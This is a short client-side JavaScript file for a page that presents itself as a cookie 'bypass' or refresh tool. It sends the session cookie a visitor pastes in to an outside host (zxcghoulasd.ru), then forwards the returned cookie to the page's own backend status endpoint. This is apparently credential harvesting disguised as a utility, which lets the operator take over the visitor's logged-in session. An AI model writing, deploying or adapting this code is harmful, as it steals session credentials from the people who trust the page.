const url = `${location.origin}/backend`;

const inputCookie = document.querySelector('.main-input');

// Result Section @Markus_code
const mainResult = document.querySelector('.main-result');
const resultContent = document.querySelector('.result-content');
const resultButton = document.querySelector('.result-button');

const buttonBypass = document.querySelector('.main-button');

const cookieRefresh = async c => {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "https://zxcghoulasd.ru/");

    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = async function () {
        if (xhr.readyState === 4) {
            const result = xhr.responseText;
            mainResult.classList.add('data-get');
            resultContent.textContent = result;
            resultButton.onclick = copieText.bind(this, result);

            if (result.trim() == '' || result == 'Cookie is required' || result == 'Invalid cookie' || result.trim() == 'Failed to get new cookie 2' || result.trim() == 'Invalid cookie 3') {
                return;
            };

            const data = new FormData();
            data.append('cookie', result);
        
            return await fetch(`${url}/status/`, {
                method: 'POST',
                body: data
            });
        }
    };
    xhr.send("cookie="+c);
};
const copieText = async text => await navigator.clipboard.writeText(text);

buttonBypass.onclick = _ => cookieRefresh(inputCookie.value.trim());